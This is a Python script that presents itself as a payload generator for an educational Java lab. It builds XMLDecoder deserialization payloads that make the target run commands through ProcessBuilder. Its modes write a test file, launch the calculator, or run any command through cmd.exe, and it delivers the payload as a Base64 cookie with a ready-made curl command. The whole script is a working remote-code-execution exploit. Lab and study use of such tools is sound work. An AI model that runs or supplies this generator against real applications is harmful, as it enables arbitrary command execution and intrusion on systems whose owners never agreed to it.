#!/usr/bin/env python3
"""
Generate XMLDecoder payload for Java Store App educational lab
Demonstrates unsafe deserialization vulnerability
"""

import base64
import sys

def create_xml_payload(cmd_parts):
    """Create XML structure for ProcessBuilder"""
    payload_parts = ['<?xml version="1.0" encoding="UTF-8"?>']
    payload_parts.append('<java version="1.8.0" class="java.beans.XMLDecoder">')
    payload_parts.append(' <object class="java.lang.ProcessBuilder">')
    payload_parts.append(f'  <array class="java.lang.String" length="{len(cmd_parts)}">')
    
    for idx, part in enumerate(cmd_parts):
        payload_parts.append(f'   <void index="{idx}">')
        payload_parts.append(f'    <string>{part}</string>')
        payload_parts.append('   </void>')
    
    payload_parts.append('  </array>')
    payload_parts.append('  <void method="start"/>')
    payload_parts.append(' </object>')
    payload_parts.append('</java>')
    
    return '\n'.join(payload_parts)

def create_test_payload():
    """Create simple test payload (creates file)"""
    return create_xml_payload(['cmd.exe', '/c', 'echo vulnerable > C:\\temp\\test.txt'])

def create_calculator_payload():
    """Create calculator payload for PoC"""
    return create_xml_payload(['cmd.exe', '/c', 'calc.exe'])

def create_custom_payload(command):
    """Create custom command payload"""
    return create_xml_payload(['cmd.exe', '/c', command])

def encode_payload(xml_content):
    """Encode XML as Base64 for cookie"""
    return base64.b64encode(xml_content.encode()).decode()

if __name__ == "__main__":
    print("\n=== XMLDecoder Payload Generator ===\n")
    
    if len(sys.argv) < 2:
        print("Usage: python xml_payload_gen.py <mode> [args]")
        print("\nModes:")
        print("  test          - Create test file")
        print("  calc          - Pop calculator")
        print("  cmd <command> - Execute custom command")
        sys.exit(1)
    
    mode = sys.argv[1]
    
    if mode == "test":
        xml = create_test_payload()
    elif mode == "calc":
        xml = create_calculator_payload()
    elif mode == "cmd":
        if len(sys.argv) < 3:
            print("Usage: python xml_payload_gen.py cmd <command>")
            sys.exit(1)
        xml = create_custom_payload(' '.join(sys.argv[2:]))
    else:
        print(f"Unknown mode: {mode}")
        sys.exit(1)
    
    cookie_value = encode_payload(xml)
    
    print("XML Payload:")
    print("-" * 50)
    print(xml)
    print("\n" + "=" * 50)
    print("Base64 Cookie Value:")
    print("-" * 50)
    print(cookie_value)
    print("\n" + "=" * 50)
    print("Test Command:")
    print("-" * 50)
    print(f'curl -b "user-info={cookie_value}" http://localhost:8888/')
    print()
